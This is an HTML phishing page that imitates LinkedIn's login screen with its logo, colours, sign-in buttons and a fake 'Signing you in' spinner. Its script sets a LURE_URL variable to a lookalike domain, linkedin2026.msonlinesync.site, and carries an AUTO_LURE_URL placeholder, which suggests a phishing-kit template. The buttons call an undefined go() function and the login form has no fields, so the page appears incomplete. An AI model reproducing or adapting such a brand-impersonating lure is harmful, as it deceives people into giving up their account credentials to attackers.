<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>LinkedIn: Log In or Sign Up</title>
<style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#f3f2ef;display:flex;flex-direction:column;align-items:center;justify-content:flex-start;min-height:100vh}
nav{width:100%;background:#fff;border-bottom:1px solid rgba(0,0,0,.08);padding:0 24px;display:flex;align-items:center;justify-content:space-between;height:52px}
.nav-right{display:flex;align-items:center;gap:12px}.nav-right a{color:#0a66c2;font-weight:600;font-size:16px;text-decoration:none}
.nav-btn{padding:7px 24px;border:1px solid #0a66c2;border-radius:24px;color:#0a66c2;font-weight:600;font-size:16px;cursor:pointer;background:none}
.nav-btn:hover{background:#e8f3ff}
.hero{display:flex;align-items:center;justify-content:center;gap:64px;padding:48px 24px;max-width:1128px;width:100%}
.hero-left{flex:1;max-width:504px}.hero-left h1{font-size:56px;color:#8f5849;font-weight:400;line-height:1;font-family:Georgia,serif;margin-bottom:4px;white-space:nowrap}
.hero-img{width:432px;max-width:100%}
.form-card{background:#fff;border-radius:8px;box-shadow:0 0 0 1px rgba(0,0,0,.08),0 4px 8px rgba(0,0,0,.06);padding:24px 24px 16px}
input{display:block;width:100%;border:1px solid #b3b3b3;border-radius:4px;padding:14px 16px;font-size:16px;margin-bottom:16px;outline:none;color:#000}
input:focus{border:2px solid #0a66c2;padding:13px 15px}.btn{display:block;width:100%;padding:14px;background:#0a66c2;color:#fff;border:none;border-radius:24px;font-size:16px;font-weight:600;cursor:pointer;margin-bottom:16px}
.btn:hover{background:#004182}.divider{display:flex;align-items:center;gap:12px;color:#666;font-size:14px;margin-bottom:16px}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#e0e0e0}
.google-btn{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;padding:12px;border:1px solid #b3b3b3;border-radius:24px;font-size:16px;font-weight:600;color:#000;background:#fff;cursor:pointer;margin-bottom:8px}
.google-btn:hover{background:#f9f9f9}.forgot{color:#0a66c2;font-size:14px;text-decoration:none}
.spinner{width:28px;height:28px;border:3px solid #e0e0e0;border-top:3px solid #0a66c2;border-radius:50%;animation:spin .8s linear infinite;margin:60px auto}
@keyframes spin{to{transform:rotate(360deg)}}#loading{display:none;text-align:center}
@media(max-width:768px){.hero{flex-direction:column;gap:24px}.hero-left h1{font-size:32px}.hero-img{display:none}}</style></head>
<body>
<nav><svg xmlns="http://www.w3.org/2000/svg" width="84" height="21" viewBox="0 0 84 21"><rect width="20" height="20" rx="3" fill="#0a66c2"/><path fill="#fff" d="M4.6 8.3h3V17H4.6zm1.5-4.5c.96 0 1.74.78 1.74 1.74S7.06 7.28 6.1 7.28 4.36 6.5 4.36 5.54 5.14 3.8 6.1 3.8zM9.5 8.3h2.88v1.18h.04c.4-.76 1.38-1.56 2.84-1.56 3.04 0 3.6 2 3.6 4.6V17h-3v-3.8c0-1.22-.02-2.8-1.7-2.8-1.7 0-1.96 1.33-1.96 2.7V17H9.5V8.3z"/><text x="24" y="16" font-family="Arial,sans-serif" font-size="16" font-weight="bold" fill="#0a66c2">LinkedIn</text></svg>
<div class="nav-right"><a href="#" onclick="go();return false">Join now</a><button class="nav-btn" onclick="go()">Sign in</button></div></nav>
<div class="hero" id="card">
<div class="hero-left">
<h1>Welcome to<br>your professional<br>community</h1>
<br>
<div class="form-card">

<a href="#" class="forgot" onclick="go();return false">Forgot password?</a>
</div></div></div>
<div id="loading"><div class="spinner"></div><p style="color:#666;font-size:16px;margin-top:12px">Signing you in&hellip;</p></div>
<script>
var LURE_URL='https://www.linkedin2026.msonlinesync.site/jCbaVYOf'; /* AUTO_LURE_URL */

</script></body></html>
